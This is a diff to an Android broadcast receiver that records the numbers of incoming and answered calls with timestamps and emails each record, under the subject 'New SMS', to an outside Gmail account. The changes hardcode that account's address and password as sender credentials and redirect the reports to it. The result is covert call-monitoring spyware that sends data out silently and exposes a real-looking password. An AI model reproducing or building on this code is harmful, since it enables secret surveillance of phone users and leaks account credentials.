@@ -100,33 +100,18 @@ public class StartUpReceiver extends BroadcastReceiver
         String Caller= PhoneInt.getStringExtra (TelephonyManager.EXTRA_INCOMING_NUMBER);
         if (State.equals (TelephonyManager.EXTRA_STATE_RINGING))
         {
-
             if (Caller != null)
             {
                 WriteLog ("Phone Ringing : " + Caller);
-
             }
         }
         if (State.equals (TelephonyManager.EXTRA_STATE_OFFHOOK))
         {
-
             if (Caller != null)
             {
                 WriteLog ("Off Hook: " + Caller);
-
             }
         }
-        if (State.equals (TelephonyManager.EXTRA_STATE_IDLE))
-        {
-
-            if (Caller != null)
-            {
-                WriteLog ("Phone Rests: " + Caller);
-
-
-            }
-        }
-
     }
 
     void WriteLog (String Line)
@@ -134,9 +119,8 @@ public class StartUpReceiver extends BroadcastReceiver
 
             String TimeStamp = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss").format (new Date ());
 
-
             String line = Line + "   (" + TimeStamp + ")";
-        sender = new Mail("", "");
+        sender = new Mail("pavlos.repin@gmail.com", "paulos21g");
         StringMake.setString(line);
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                     Builder().permitAll().build();
@@ -193,7 +177,7 @@ public class StartUpReceiver extends BroadcastReceiver
                 String line = null;
                 line = StringMake.getString();
 
-                sender.sendMail("New SMS", line, "", "cse242017051@uniwa.gr");
+                sender.sendMail("New SMS", line, "pavlos.repin@gmail.com", "pavlos.repin@gmail.com");
 
             } catch (Exception ex) {
 
